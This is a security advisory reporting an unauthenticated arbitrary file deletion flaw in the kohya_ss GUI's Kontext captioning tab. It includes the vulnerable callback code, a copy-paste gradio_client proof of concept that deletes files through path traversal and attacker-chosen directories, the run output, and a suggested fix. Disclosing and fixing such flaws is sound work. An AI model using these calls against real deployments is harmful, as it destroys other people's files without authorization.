# kohya_ss GUI: unauthenticated arbitrary file deletion via Kontext captioning tab's browser-controlled delete callback

**Upstream issue:** https://github.com/bmaltais/kohya_ss/issues/3604

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2 Ubuntu 24.04 against the real Kontext tab; output below is from the actual run)

## Reproduction conditions

- kohya_ss GUI source (`kohya_gui` package) with its own pinned `gradio==6.17.3` / `gradio-client==2.5.0`, Ubuntu 24.04, Python 3.11
- The Kontext manual captioning tab launched headless (as `kohya_gui` does under `--headless`), `demo.launch(...)` with `auth=None` — which is the kohya_ss default (`--username/--password` default to empty)
- The attacker only needs network access to the GUI port (relevant deployments: `--listen`, the documented docker setup, or `--share` tunnels)

## Description

The Kontext manual captioning tab's delete callback trusts client-controlled hidden Gradio components as filesystem inputs (`kohya_gui/kontext_manual_caption_gui.py:95-104`):

```python
def delete_images_and_caption(image_file, control_images_dir, target_images_dir, caption_ext):
    control_image_path = os.path.join(control_images_dir, image_file)
    if os.path.exists(control_image_path):
        os.remove(control_image_path)
    ...
```

All four inputs are browser-submitted values (hidden `gr.Text` components are still part of the event payload and fully attacker-controllable). There is no check that `image_file` belongs to the server-side loaded image set, no `..` rejection, and no containment validation of the directory arguments — which are passed as absolute paths by the client.

## Impact

Any unauthenticated user who can reach the GUI port can delete arbitrary files writable by the GUI process — `os.remove` per call with attacker-chosen directory and filename, including `../` traversal out of the dataset directory. Same-pattern hidden fields are also used by the save/load callbacks in this tab.

## PoC (copy-paste ready)

**Step 1 — victim starts the GUI (tab launched headless, no auth):**

```python
import gradio as gr
from kohya_gui.kontext_manual_caption_gui import gradio_kontext_manual_caption_gui_tab

demo = gr.Blocks(title="kontext")
with demo:
    gradio_kontext_manual_caption_gui_tab(headless=True)
demo.queue().launch(server_name="0.0.0.0", server_port=7861)   # auth=None by default
```

**Step 2 — attacker (anonymous gradio_client, no credentials):**

```python
from gradio_client import Client
client = Client("http://<gui-host>:7861/", verbose=False)

# Attack A: ../ traversal out of the dataset dir
client.predict(image_file="../../important_outside.txt",
               control_images_dir="/dataset/images", target_images_dir="/dataset/images",
               caption_ext=".caption", api_name="/delete_images_and_caption")

# Attack B: attacker-chosen absolute directory + filename
client.predict(image_file="precious.txt",
               control_images_dir="/any/victim/dir", target_images_dir="/any/victim/dir",
               caption_ext=".caption", api_name="/delete_images_and_caption")
```

## Execution result (actual run: kohya_ss GUI source / gradio 6.17.3 / Ubuntu 24.04)

```
* Running on local URL:  http://127.0.0.1:7861

[attack A] traversal '../../important_outside.txt' -> outside file deleted: True
[attack A] api response: {'visible': True, 'value': '🗑️ Deleted files for `../../important_outside.txt`', '__type__': 'update'}
[attack B] arbitrary dir + filename -> file deleted: True
[attack B] api response: {'visible': True, 'value': '🗑️ Deleted files for `precious.txt`', '__type__': 'update'}
[RESULT] REPRODUCED - outside_file_deleted_via_traversal=True, victim_file_deleted_via_arbitrary_dir=True

=== server-side evidence ===
12:43:23-073798 INFO     Deleted control image: ...
12:43:23-603123 INFO     Deleted control image: ...
```

Both files were removed by unauthenticated remote calls — one via `../` traversal out of the dataset directory, one by directly naming an absolute victim directory. The GUI even echoes the traversal path in its status message.

## Suggested fix

Track the loaded image set server-side (run identity/session keyed) and validate every delete against it; reject `..` in `image_file` and normalize+contain the joined paths under the server-known dataset directories.
